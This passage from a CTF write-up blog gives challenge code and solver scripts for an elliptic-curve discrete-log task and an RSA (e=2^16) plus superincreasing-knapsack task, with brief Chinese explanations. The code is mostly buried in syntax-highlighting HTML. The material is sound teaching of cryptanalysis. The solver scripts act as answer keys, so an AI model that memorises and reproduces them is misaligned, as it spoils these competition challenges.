class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> \n    <span class=\"token keyword\">assert</span> part1<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    cipher <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> P <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"N = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>p<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"a = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>a<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, b = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>b<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"P = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>P<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"cipher</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>cipher<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">part2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span>  <span class=\"token number\">839252355769732556552066312852886325703283133710701931092148932185749211043</span>\n    a <span class=\"token operator\">=</span>  <span class=\"token number\">166868889451291853349533652847942310373752202024350091562181659031084638450</span>\n    b <span class=\"token operator\">=</span>  <span class=\"token number\">168504858955716283284333002385667234985259576554000582655928538041193311381</span>\n    P <span class=\"token operator\">=</span> E<span class=\"token punctuation\">.</span>random_point<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    Q <span class=\"token operator\">=</span> key<span class=\"token operator\">*</span>P\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p = \"</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a = \"</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b = \"</span><span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"P = \"</span><span class=\"token punctuation\">,</span>P<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Q = \"</span><span class=\"token punctuation\">,</span>Q<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">assert</span> part2<span class=\"token operator\">=</span>key\n\npart1<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-------------------------------------------\"</span><span class=\"token punctuation\">)</span>\npart2<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">assert</span> flag<span class=\"token operator\">=</span><span class=\"token string\">\"flag&#123;\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>part1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"-\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>part2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"&#125;\"</span></code></pre>\n\n<p>part1：发现n &#x3D; [random.randint(1, 2**20) for _ in range(3)] ，在可以爆破的范围，直接爆破出n即可</p>\n<p>part2：数字较小直接求离散对数即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\">N <span class=\"token operator\">=</span> <span class=\"token number\">8186762541745429544201163537921168767557829030115874801599552603320381728161132002130533050721684554609459754424458805702284922582219134865036743485620797</span>\na <span class=\"token operator\">=</span> <span class=\"token number\">1495420997701481377470828570661032998514190598989197201754979317255564287604311958150666812378959018880028977121896929545639701195491870774156958755735447</span>\nb <span class=\"token operator\">=</span> <span class=\"token number\">5991466901412408757938889677965118882508317970919705053385317474407117921506012065861844241307270755999163280442524251782766457119443496954015171881396147</span>\nE1 <span class=\"token operator\">=</span> EllipticCurve<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nP <span class=\"token operator\">=</span> E1<span class=\"token punctuation\">(</span><span class=\"token number\">6053058761132539206566092359337778642106843252217768817197593657660613775577674830119685211727923302909194735842939382758409841779476679807381619373546323</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">7059796954840479182074296506322819844555365317950589431690683736872390418673951275875742138479119268529134101923865062199776716582160225918885119415223226</span> <span class=\"token punctuation\">)</span>\n\ncipher0 <span class=\"token operator\">=</span> E1<span class=\"token punctuation\">(</span><span class=\"token number\">4408587937721811766304285221308758024881057826193901720202053016482471785595442728924925855745045433966244594468163087104593409425316538804577603801023861</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">5036207336371623412617556622231677184152618465739959524167001889273208946091746905245078901669335908442289383798546066844566618503786766455892065155724816</span> <span class=\"token punctuation\">)</span>\ncipher1 <span class=\"token operator\">=</span> E1<span class=\"token punctuation\">(</span><span class=\"token number\">2656427748146837510897512086140712942840881743356863380855689945832188909581954790770797146584513962618190767634822273749569907212145053676352384889228875</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">4010263650619965046904980178893999473955022015118149348183137418914551275841596653682626506158128955577872592363930977349664669161585732323838763793957500</span> <span class=\"token punctuation\">)</span>\ncipher2 <span class=\"token operator\">=</span> E1<span class=\"token punctuation\">(</span><span class=\"token number\">1836350123050832793309451054411760401335561429787905037706697802971381859410503854213212757333551949694177845513529651742217132039482986693213175074097638</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">1647556471109115097539227566131273446643532340029032358996281388864842086424490493200350147689138143951529796293632149050896423880108194903604646084656434</span> <span class=\"token punctuation\">)</span>\ncipher<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span>cipher0<span class=\"token punctuation\">,</span>cipher1<span class=\"token punctuation\">,</span>cipher2<span class=\"token punctuation\">]</span>\n<span class=\"token triple-quoted-string string\">'''n=[]\nfrom tqdm import tqdm\nfor k in tqdm(range(2**12,2**20)):\n    if k*P in cipher:\n            n.append(int(k))\n    if len(n)==3:\n        break\n\nprint(n)'''</span>\nn<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">651602</span><span class=\"token punctuation\">,</span> <span class=\"token number\">943532</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1008061</span><span class=\"token punctuation\">]</span>\npart1<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>part1<span class=\"token punctuation\">)</span>\n\np2 <span class=\"token operator\">=</span>  <span class=\"token number\">839252355769732556552066312852886325703283133710701931092148932185749211043</span>\na2 <span class=\"token operator\">=</span>  <span class=\"token number\">166868889451291853349533652847942310373752202024350091562181659031084638450</span>\nb2 <span class=\"token operator\">=</span>  <span class=\"token number\">168504858955716283284333002385667234985259576554000582655928538041193311381</span>\nE2 <span class=\"token operator\">=</span> EllipticCurve<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span>p2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>a2<span class=\"token punctuation\">,</span> b2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nP2 <span class=\"token operator\">=</span>  E2<span class=\"token punctuation\">(</span><span class=\"token number\">547842233959736088159936218561804098153493246314301816190854370687622130932</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">259351987899983557442340376413545600148150183183773375317113786808135411950</span><span class=\"token punctuation\">)</span>\nQ <span class=\"token operator\">=</span>  E2<span class=\"token punctuation\">(</span><span class=\"token number\">52509027983019069214323702207915994504051708473855890224511139305828303028</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">520507172059483331872189759719244369795616990414416040196069632909579234481</span><span class=\"token punctuation\">)</span>\n\nkey<span class=\"token operator\">=</span>P2<span class=\"token punctuation\">.</span>discrete_log<span class=\"token punctuation\">(</span>Q<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nkey1<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span>  <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>cipher<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> n<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>P<span class=\"token operator\">==</span>cipher<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n            key1<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>n<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>key1<span class=\"token punctuation\">)</span>\n\npart1<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> key1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\nflag<span class=\"token operator\">=</span><span class=\"token string\">\"flag&#123;\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>part1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"-\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"&#125;\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></code></pre>\n\n<h3 id=\"Ez-Calculate-ucsc\"><a href=\"#Ez-Calculate-ucsc\" class=\"headerlink\" title=\"Ez_Calculate-ucsc\"></a><strong>Ez_Calculate-ucsc</strong></h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> randint\n<span class=\"token keyword\">from</span> hashlib <span class=\"token keyword\">import</span> md5\n\nflag1 <span class=\"token operator\">=</span> <span class=\"token string\">b'xxx'</span>\nflag2 <span class=\"token operator\">=</span> <span class=\"token string\">b'xxx'</span>\nFlags <span class=\"token operator\">=</span> <span class=\"token string\">'flag&#123;'</span> <span class=\"token operator\">+</span> md5<span class=\"token punctuation\">(</span>flag1<span class=\"token operator\">+</span>flag2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token string\">'&#125;'</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">backpack_encrypt_flag</span><span class=\"token punctuation\">(</span>flag_bytes<span class=\"token punctuation\">,</span> M<span class=\"token punctuation\">,</span> group_len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> byte <span class=\"token keyword\">in</span> flag_bytes<span class=\"token punctuation\">:</span>\n        bits<span class=\"token punctuation\">.</span>extend<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> b <span class=\"token keyword\">in</span> <span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">,</span> <span class=\"token string\">\"08b\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> group_len <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        bits<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n    S_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> group_len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        group <span class=\"token operator\">=</span> bits<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i <span class=\"token operator\">+</span> group_len<span class=\"token punctuation\">]</span>\n        S <span class=\"token operator\">=</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span>bit <span class=\"token operator\">*</span> m <span class=\"token keyword\">for</span> bit<span class=\"token punctuation\">,</span> m <span class=\"token keyword\">in</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>group<span class=\"token punctuation\">,</span> M<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        S_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>S<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> S_list\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">backpack</span><span class=\"token punctuation\">(</span>flag_bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    R <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">:</span>\n        next_val <span class=\"token operator\">=</span> randint<span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> R<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> R<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        R<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>next_val<span class=\"token punctuation\">)</span>\n    B <span class=\"token operator\">=</span> randint<span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> R<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> R<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    A <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\n    M <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>A <span class=\"token operator\">*</span> ri <span class=\"token operator\">%</span> B <span class=\"token keyword\">for</span> ri <span class=\"token keyword\">in</span> R<span class=\"token punctuation\">]</span>\n    S_list <span class=\"token operator\">=</span> backpack_encrypt_flag<span class=\"token punctuation\">(</span>flag_bytes<span class=\"token punctuation\">,</span> M<span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>M<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> R<span class=\"token punctuation\">,</span> A<span class=\"token punctuation\">,</span> B<span class=\"token punctuation\">,</span> M<span class=\"token punctuation\">,</span> S_list\n\np <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span>\nq <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span>\nn <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q\ne <span class=\"token operator\">=</span> <span class=\"token number\">0x10000</span>\nm <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag1<span class=\"token punctuation\">)</span>\nk <span class=\"token operator\">=</span> randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">999</span><span class=\"token punctuation\">)</span>\nproblem1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> n\nproblem2 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span>q<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span>\nc <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span>\n\nR<span class=\"token punctuation\">,</span> A<span class=\"token punctuation\">,</span> B<span class=\"token punctuation\">,</span> M<span class=\"token punctuation\">,</span> S_list <span class=\"token operator\">=</span> backpack<span class=\"token punctuation\">(</span>flag2<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">r\"C:\\Users\\Rebirth\\Desktop\\data.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"problem1 = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>problem1<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"problem2 = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>problem2<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"n = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"c = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"-------------------------\\n\"</span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"R = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>R<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"A = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>A<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"B = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>B<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"M = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>M<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"S_list = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>S_list<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"-------------------------\\n\"</span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"What you need to submit is Flags!\\n\"</span></span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>分两部分，第一部分e&#x3D;2**16，使用Tonelli–Shanks以及中国剩余定理求解m</p>\n<p>第二部分是普通的超递增背包，求解即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> randint\n<span class=\"token keyword\">from</span> hashlib <span class=\"token keyword\">import</span> md5\n\ne<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10000</span><span class=\"token punctuation\">)</span>\nproblem1 <span class=\"token operator\">=</span> <span class=\"token number\">24819077530766367166035941051823834496451802693325219476153953490742162231345380863781267094224914358021972805811737102184859249919313532073566493054398702269142565372985584818560322911207851760003915310535736092154713396343146403645986926080307669092998175883480679019195392639696872929250699367519967334248</span>\nproblem2 <span class=\"token operator\">=</span> <span class=\"token number\">20047847761237831029338089120460407946040166929398007572321747488189673799484690384806832406317298893135216999267808940360773991216254295946086409441877930687132524014042802810607804699235064733393301861594858928571425025486900981252230771735969897010173299098677357738890813870488373321839371734457780977243838253195895485537023584305192701526016</span>\nn <span class=\"token operator\">=</span> <span class=\"token number\">86262122894918669428795269753754618836562727502569381672630582848166228286806362453183099819771689423205156909662196526762880078792845161061353312693752568577607175166060900619163231849790003982326663277243409696279313372337685740601191870965951317590823292785776887874472943335746122798330609540525922467021</span>\nc <span class=\"token operator\">=</span> <span class=\"token number\">74962027356320017542746842438347279031419999636985213695851878703229715143667648659071242394028952959096683055640906478244974899784491598741415530787571499313545501736858104610426804890565497123850685161829628373760791083545457573498600656412030353579510452843445377415943924958414311373173951242344875240776</span>\n\nR <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">227</span><span class=\"token punctuation\">,</span> <span class=\"token number\">506</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1372</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3042</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6163</span><span class=\"token punctuation\">]</span>\nA <span class=\"token operator\">=</span> <span class=\"token number\">1253412688290469788410859162653</span>\nB <span class=\"token operator\">=</span> <span class=\"token number\">16036</span>\nM <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">10294</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12213</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10071</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4359</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1310</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4376</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7622</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14783</span><span class=\"token punctuation\">]</span>\nS_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">13523</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32682</span><span class=\"token punctuation\">,</span> <span class=\"token number\">38977</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44663</span><span class=\"token punctuation\">,</span> <span class=\"token 